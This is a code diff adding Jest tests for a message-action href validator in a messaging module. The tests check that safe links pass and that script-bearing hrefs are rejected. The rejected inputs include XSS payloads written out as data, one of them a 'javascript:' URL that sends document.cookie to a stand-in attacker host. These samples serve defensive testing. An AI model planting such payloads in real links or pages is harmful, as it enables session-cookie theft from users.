@@ -1,4 +1,4 @@
-import { composeMessageSchema, forwardMessageSchema, updateDraftSchema } from '../validators'
+import { composeMessageSchema, forwardMessageSchema, messageActionSchema, updateDraftSchema } from '../validators'
 
 describe('messages validators', () => {
   it('rejects duplicate recipient ids during compose', () => {
@@ -137,5 +137,50 @@ describe('messages validators', () => {
     })
 
     expect(result.success).toBe(false)
+  })
+
+  describe('message action href', () => {
+    const baseAction = { id: 'action-1', label: 'Open' }
+
+    it.each([
+      '/backend/sales/orders/1',
+      'https://example.com/orders/1',
+      'mailto:support@example.com',
+      'tel:+123456789',
+    ])('accepts safe href %s', (href) => {
+      const result = messageActionSchema.safeParse({ ...baseAction, href })
+      expect(result.success).toBe(true)
+    })
+
+    it('accepts an action without an href', () => {
+      const result = messageActionSchema.safeParse({ ...baseAction, commandId: 'sales.orders.approve' })
+      expect(result.success).toBe(true)
+    })
+
+    it.each([
+      'javascript:fetch(`//attacker/?c=`+document.cookie)',
+      'JavaScript:alert(1)',
+      '  javascript:alert(1)',
+      'data:text/html,<script>alert(1)</script>',
+      'vbscript:msgbox(1)',
+      '//evil.example.com/steal',
+    ])('rejects unsafe href %s', (href) => {
+      const result = messageActionSchema.safeParse({ ...baseAction, href })
+      expect(result.success).toBe(false)
+    })
+
+    it('rejects a composed message carrying a javascript: action href', () => {
+      const result = composeMessageSchema.safeParse({
+        subject: 'Subject',
+        body: 'Body',
+        visibility: 'internal',
+        recipients: [{ userId: '11111111-1111-1111-8111-111111111111', type: 'to' }],
+        actionData: {
+          actions: [{ id: 'pwn', label: 'Click me', href: 'javascript:alert(document.cookie)' }],
+        },
+      })
+
+      expect(result.success).toBe(false)
+    })
   })
 })
